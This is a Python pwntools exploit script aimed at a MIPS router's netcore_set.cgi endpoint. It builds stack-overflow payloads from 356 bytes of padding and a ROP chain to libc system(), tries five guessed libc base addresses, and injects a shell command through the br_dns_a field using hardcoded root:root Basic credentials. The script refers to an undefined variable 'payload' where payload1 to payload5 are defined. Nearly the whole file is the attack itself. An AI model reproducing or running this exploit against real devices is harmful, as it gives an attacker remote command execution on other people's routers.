import requests
from pwn import *

context(arch='mips', os='linux', endian='big', word_size=32)

libc_base = 0x77f7c000
libc_base2 = 0x7713e000
libc_base3 = 0x77d44000
libc_base4 = 0x77011000
libc_base5 = 0x77c4d000

system = 0x00029250
rop1 = 0x0001D0B4
rop2 = 0x0001E148
cmd = b'ls > /var/666777'

url = "http://192.168.5.12/cgi-bin-igd/netcore_set.cgi"
payload1 = b"A"*356+p32(libc_base+rop2)+p32(libc_base+system)+b'B'*16+p32(libc_base+rop1)+b'L'*24+cmd
payload2 = b"A"*356+p32(libc_base2+rop2)+p32(libc_base2+system)+b'B'*16+p32(libc_base2+rop1)+b'L'*24+cmd
payload3 = b"A"*356+p32(libc_base3+rop2)+p32(libc_base3+system)+b'B'*16+p32(libc_base3+rop1)+b'L'*24+cmd
payload4 = b"A"*356+p32(libc_base4+rop2)+p32(libc_base4+system)+b'B'*16+p32(libc_base4+rop1)+b'L'*24+cmd
payload5 = b"A"*356+p32(libc_base5+rop2)+p32(libc_base5+system)+b'B'*16+p32(libc_base5+rop1)+b'L'*24+cmd

data = {"mode_name": "netcore_set","wan_set": "1", "br_dns_a": payload}
headers = {
    "Upgrade-Insecure-Requests": "1",
    "Connection": "keep-alive",
    "Authorization": "Basic cm9vdDpyb290",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Host": "192.168.5.12"
}

res = requests.post(url = url, headers = headers, data = data)


